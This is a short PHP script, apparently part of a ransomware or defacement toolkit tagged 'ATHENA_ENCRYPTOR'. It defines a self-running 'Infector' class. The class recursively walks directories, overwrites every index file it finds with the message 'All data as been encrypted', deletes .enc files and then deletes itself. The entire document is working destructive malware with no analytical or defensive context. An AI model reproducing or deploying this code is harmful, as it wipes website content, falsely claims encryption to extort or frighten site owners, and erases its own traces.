<?php

class Infector{

    protected $LI = [
        'index.php',
        'index.html',
        'index.tpl',
        'index.blade.php',
        'index.html.enc',
        'index.php.enc',
        'index.blade.php.enc',
        'index.tpl.enc'
    ];
    protected $directory;

    /**
     * Infector constructor.
     */
    public function __construct()
    {
        $this->run(__DIR__);
    }

    /**
     * @param $directory
     */
    protected function run($directory)
    {
        $LF = scandir($directory);
        foreach ($LF as $F)
        {
            if($F != '.' && $F != '..' && $F != '.DS_STORE' && $F != ".git" && $F != ".idea") {
                if (in_array($F, $this->LI)) {
                    $NNF = $F;
                    if(stristr($F, '.enc')) {
                        $NNF = explode('.enc', $F)[0];
                        @unlink($directory . '/' . $F);
                    }
                    $F_I = fopen($directory . '/' . $NNF, 'w');
                    fwrite($F_I,"<span style='color:white;display:none;'>_ATHENA_ENCRYPTOR_SUMMARY</span><b>All data as been encrypted</b>");
                    fclose($F_I);
                } else {
                    if (is_dir($directory . '/' . $F)) {
                        $this->run($directory . '/' . $F);
                    }
                }
            }
        }
        @unlink(__FILE__);
    }
}

new Infector();